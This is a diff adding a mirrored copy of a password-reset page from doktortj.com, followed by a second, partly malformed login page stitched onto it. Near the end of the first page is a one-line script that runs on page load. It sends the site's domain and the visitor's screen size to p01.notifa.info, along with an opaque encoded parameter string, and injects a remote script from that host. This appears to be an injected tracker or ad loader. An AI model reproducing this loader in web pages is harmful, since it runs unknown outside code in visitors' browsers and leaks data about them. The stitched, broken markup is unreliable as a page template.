@@ -1,0 +1,218 @@
+<link rel="shortcut icon" href="../public/img/icontab.png">
+
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from doktortj.com/password/reset by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 11 Sep 2019 13:06:14 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+	<title>RESET PASSWORD</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--===============================================================================================-->
+	<link rel="icon" type="image/png" href="images/icons/favicon.html"/>
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="../public/vendor/bootstrap/css/bootstrap.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="../public/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="../public/fonts/Linearicons-Free-v1.0.0/icon-font.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="../public/vendor/animate/animate.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="../public/vendor/css-hamburgers/hamburgers.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="../public/vendor/animsition/css/animsition.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="../public/vendor/select2/select2.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="../public/vendor/daterangepicker/daterangepicker.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="../public/css/util.css">
+	<link rel="stylesheet" type="text/css" href="../public/css/main.css">
+<!--===============================================================================================-->
+</head>
+<body>
+
+	<div class="limiter">
+		<div class="container-login100" style="background-image: url('../public/images/p-2.jpg');">
+			<div class="wrap-login100 p-t-30 p-b-50">
+				<span class="login100-form-title p-b-41">
+					Reset Password
+				</span>
+
+        <div class="panel-body">
+            				<form class="login100-form validate-form p-b-33 p-t-5" method="POST" action="http://doktortj.com/password/email">
+            <input type="hidden" name="_token" value="nUebV4DI2OPsFNsaWbokhO3qNVdniTLXd0ydB5Il">
+
+					<div class="wrap-input100 validate-input form-group" data-validate = "Enter username">
+            <input id="email" type="email" class="input100" name="email" value="" placeholder="Email" required>
+
+            						<span class="focus-input100" data-placeholder="&#xe82a;"></span>
+					</div>
+
+          <div class="container-login100-form-btn m-t-32">
+            <button type="submit" class="login100-form-btn">
+                Send Password Reset Link
+            </button>
+					</div>
+
+			</div>
+		</div>
+	</div>
+
+
+	<div id="dropDownSelect1"></div>
+
+<!--===============================================================================================-->
+	<script src="../public/vendor/jquery/jquery-3.2.1.min.js"></script>
+<!--===============================================================================================-->
+	<script src="../public/vendor/animsition/js/animsition.min.js"></script>
+<!--===============================================================================================-->
+	<script src="../public/vendor/bootstrap/js/popper.js"></script>
+	<script src="../public/vendor/bootstrap/js/bootstrap.min.js"></script>
+<!--===============================================================================================-->
+	<script src="../public/vendor/select2/select2.min.js"></script>
+<!--===============================================================================================-->
+	<script src="../public/vendor/daterangepicker/moment.min.js"></script>
+	<script src="../public/vendor/daterangepicker/daterangepicker.js"></script>
+<!--===============================================================================================-->
+	<script src="../public/vendor/countdowntime/countdowntime.js"></script>
+<!--===============================================================================================-->
+  <script type="text/javascript">
+
+(function ($) {
+    "use strict";
+
+
+    /*==================================================================
+    [ Focus input ]*/
+    $('.input100').each(function(){
+        $(this).on('blur', function(){
+            if($(this).val().trim() != "") {
+                $(this).addClass('has-val');
+            }
+            else {
+                $(this).removeClass('has-val');
+            }
+        })
+    })
+
+
+    /*==================================================================
+    [ Validate ]*/
+    var input = $('.validate-input .input100');
+
+    $('.validate-form').on('submit',function(){
+        var check = true;
+
+        for(var i=0; i<input.length; i++) {
+            if(validate(input[i]) == false){
+                showValidate(input[i]);
+                check=false;
+            }
+        }
+
+        return check;
+    });
+
+
+    $('.validate-form .input100').each(function(){
+        $(this).focus(function(){
+           hideValidate(this);
+        });
+    });
+
+    function validate (input) {
+        if($(input).attr('type') == 'email' || $(input).attr('name') == 'email') {
+            if($(input).val().trim().match(/^([a-zA-Z0-9_\-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{1,5}|[0-9]{1,3})(\]?)$/) == null) {
+                return false;
+            }
+        }
+        else {
+            if($(input).val().trim() == ''){
+                return false;
+            }
+        }
+    }
+
+    function showValidate(input) {
+        var thisAlert = $(input).parent();
+
+        $(thisAlert).addClass('alert-validate');
+    }
+
+    function hideValidate(input) {
+        var thisAlert = $(input).parent();
+
+        $(thisAlert).removeClass('alert-validate');
+    }
+
+    /*==================================================================
+    [ Show pass ]*/
+    var showPass = 0;
+    $('.btn-show-pass').on('click', function(){
+        if(showPass == 0) {
+            $(this).next('input').attr('type','text');
+            $(this).addClass('active');
+            showPass = 1;
+        }
+        else {
+            $(this).next('input').attr('type','password');
+            $(this).removeClass('active');
+            showPass = 0;
+        }
+
+    });
+
+
+})(jQuery);
+</script>
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2l%2bB0za4hQVflWrl%2byzLRz9NY6UD5uNYJQ9dBYdwn%2b4Lb5tvRt2rpvVExgolVF%2fs9Xnui8EFl6Li9ai3Ygb6Qq9HZgWtuCKq4sPHKIB7ocMTBGduE67h1WdAp42JXIjRcRGvi6UKT0%2fpyabzB4xfAyvsiZNbfSedvkDVDiXws4H%2fGVzvfARHVeL9msUSjJkpqaiOzEPpAnPVIJnMjGQ7tT%2bgva1FYDuJHGfpOLq9srEsXO6g3WRXPvPXOtuGb9p3RdzdRZZDIeFoEI575eSsceZfszKSP%2f9nxdS0RMhWrjFhpFIG%2bqiiZGQ3aUr93I6diFL6OigdnX25Cr7ccEnOI6S0HxArtS6pKqrNZG%2bx7ynpGwkMHM1zUdRRxI3fX%2b42jZpmaZjvbXSr8mkkEOZ9FpqfvtKvOYRea0rtry0joL4fygjX1tnHaNWgbq4%2fSSIFoXysnSVbrNTQmWyXmqcQQivpH89TLih9v" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+<!-- Mirrored from doktortj.com/password/reset by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 11 Sep 2019 13:06:14 GMT -->
+</html>
+
+<!DOCTYPE html>
+<html lang="en" prefix="og:http://ogp.me/ns#" >
+<head>
+    <meta property="og:url" content="http://doktortj.com/"/>
+    <meta property="og:tittle" content="http://doktortj.com/"/>
+    <meta property="og:description" content="Lebih Dekat Dengan DoktorTJ"/>
+    <meta property="og:image" content="http://doktortj.com/public/img/icontabbb.png"/>
+    <meta property="og:image:secure_url" content="http://doktortj.com/public/img/icontabbb.png"/>
+    <meta property="og:image:width" content="200"/>
+    <meta property="og:image:height" content="200"/>
+    <meta property="og:type" content="website"/>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- CSRF Token -->
+    <link rel="shortcut icon" href="../public/img/icontab.png">
+    <meta name="csrf-token" content="nUebV4DI2OPsFNsaWbokhO3qNVdniTLXd0ydB5Il">
+
+    <title>Login</title>
+
+    <!-- Styles -->
+    <link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link href="../public/css/app.css" rel="stylesheet">
+        <link href="../public/css/login.html" rel="stylesheet">
+    <link rel="stylesheet" href="../public/css/bootstrap.min.html" >
+
+</head>
+<body>
+  <div id="app">
+
+
+
+              </div>
+          </nav>
+
+                </div>
+
+      <!-- Scripts -->
+      <script src="../js/app.html"></script>
+</body>
+</html>
